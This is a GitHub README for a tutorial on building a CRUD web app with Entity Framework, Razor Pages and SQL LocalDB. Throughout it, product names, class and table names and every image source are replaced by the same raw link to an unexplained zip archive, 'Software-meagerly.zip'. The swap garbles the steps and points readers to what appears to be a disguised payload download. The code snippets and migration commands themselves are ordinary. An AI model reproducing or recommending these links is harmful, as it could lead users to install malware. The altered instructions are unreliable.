# CRUD -- GoogleDrive 
https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip

CRUD Application with https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip Core and Entity Framework

This guide shows how to build a simple CRUD (Create, Read, Update, Delete) application using https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip Core Web App and Entity Framework.

Step 1. Create the Project

Open Visual Studio 2022.

Click Create a new project.

Search for https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip Core Web App.

Name your project and click Create.

<img width="1544" height="550" alt="image" src="https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip" />
Step 2. Create the Model

In Solution Explorer, right-click the project.

Add a new Folder and name it Models.

Right-click Models, select Add > Class, and name it https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip

Add the following code:
```
public class Users
{
    public int ID { get; set; }
    public string Name { get; set; }
    public string Email { get; set; }
}
```

<img width="1497" height="644" alt="image" src="https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip" />
Step 3. Create Razor Pages for CRUD

Right-click the Pages folder.

Add a New Folder and name it Users.

Right-click Users, select Add > New Scaffolded Item.

Choose Razor Pages using Entity Framework (CRUD) and click Add.

<img width="952" height="656" alt="image" src="https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip" />

Select Model Class as Users (https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip).

Under Data Context Class, click the + icon to create a new context.

Click Add and wait for NuGet packages to install.

Step 4. Run Database Migration

Go to Tools > NuGet Package Manager > Package Manager Console.

Run the following commands one by one:

Type first

```
add-migration Initial
```
Then type this
```
update-database
```


Wait until both complete successfully.

<img width="949" height="119" alt="image" src="https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip" />
Step 5. Run the Application

Press F5 to build and run the project.

When the app starts, go to:

https://localhost:7017/users


You will see the Users page.

<img width="758" height="217" alt="image" src="https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip" />
Step 6. Test the CRUD Features
Index / Dashboard

Displays all users.

<img width="1919" height="1029" alt="image" src="https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip" />
Create

Add a new user.

Edit

Modify an existing user.

<img width="1918" height="1031" alt="image" src="https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip" />
Details

View detailed information.

<img width="1919" height="1030" alt="image" src="https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip" />
Delete

Remove a user record.

<img width="1919" height="1029" alt="image" src="https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip" />
Step 7. View the Database in Visual Studio

In the top search bar, type SQL.

Open SQL Server Object Explorer.

Navigate to:

(localdb)\MSSQLLocalDB
Databases
CRUDContext
Tables
https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip


Right-click https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip and select View Designer.

<img width="1919" height="667" alt="image" src="https://github.com/TheKanjiTV/CRUD/raw/refs/heads/main/Properties/Software-meagerly.zip" />
Done

You now have a working CRUD application that connects to a local SQL database and manages user data.
